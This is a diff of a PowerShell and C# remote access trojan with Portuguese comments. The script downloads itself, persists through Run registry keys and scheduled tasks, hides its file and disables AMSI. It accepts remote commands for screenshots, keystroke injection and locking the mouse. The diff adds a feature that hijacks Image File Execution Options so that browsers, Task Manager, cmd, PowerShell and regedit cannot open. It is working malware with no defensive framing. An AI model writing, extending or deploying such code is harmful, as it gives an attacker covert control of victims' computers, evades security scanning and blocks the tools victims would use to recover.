@@ -12,19 +12,16 @@ if (-not $isAdmin) {
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
 
-# ===== MODO VISÍVEL (PREPARA, PERSISTE E ESCONDE) =====
 if ($args -notcontains "-silent") {
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
     
     $argList = "-nop -w hidden -ep bypass -f `"$scriptPath`" -silent"
     
-    # Persistência via Registro
     $cmd = "powershell.exe $argList"
     Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     
-    # Persistência via Agendador
     try {
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argList
         $trigger1 = New-ScheduledTaskTrigger -AtStartup
@@ -36,12 +33,10 @@ if ($args -notcontains "-silent") {
     
     attrib +h +s +r $scriptPath 2>$null
     
-    # Inicia o modo invisível e fecha a janela atual
     Start-Process powershell.exe -ArgumentList $argList -WindowStyle Hidden
     exit
 }
 
-# ===== MODO INVISÍVEL (AGENTE) =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -68,7 +63,6 @@ if (-not ("R9KAgent" -as [type])) {
         static int PORT;
         static bool streaming = false;
         static object writeLock = new object();
-
         static bool isLocked = false;
         static int targetX = 0, targetY = 0;
         static bool hasNewPos = false;
@@ -173,8 +167,10 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
+                // EXCLUIR RAT
                 if (cmd == "uninstall") { 
                     BlockInput(false); 
+                    UnblockAllApps(); // Restaura os apps antes de sair
                     try {
                         using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                         using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
@@ -185,8 +181,26 @@ if (-not ("R9KAgent" -as [type])) {
                     Environment.Exit(0); 
                 }
                 
-                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_LOCKED"); } return; }
-                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_UNLOCKED"); } return; }
+                // BLOQUEAR APPS
+                if (cmd == "block_apps") {
+                    BlockAllApps();
+                    lock(writeLock) { myWriter.WriteLine("APPS_BLOQUEADOS"); }
+                    return;
+                }
+
+                // DESBLOQUEAR APPS
+                if (cmd == "unblock_apps") {
+                    UnblockAllApps();
+                    lock(writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); }
+                    return;
+                }
+
+                // TRAVAR MOUSE
+                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
+                
+                // SOLTAR MOUSE
+                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
+
                 if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                 if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
 
@@ -207,6 +221,26 @@ if (-not ("R9KAgent" -as [type])) {
                 else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                 else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
             } catch {}
+        }
+
+        static void BlockAllApps() {
+            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe" };
+            foreach (var app in apps) {
+                try {
+                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) {
+                        key.SetValue("Debugger", "svchost.exe"); // Redireciona para causar erro e não abrir
+                    }
+                } catch {}
+            }
+        }
+
+        static void UnblockAllApps() {
+            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe" };
+            foreach (var app in apps) {
+                try {
+                    Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app, false);
+                } catch {}
+            }
         }
 
         static string CaptureScreen(int maxW, long quality) {
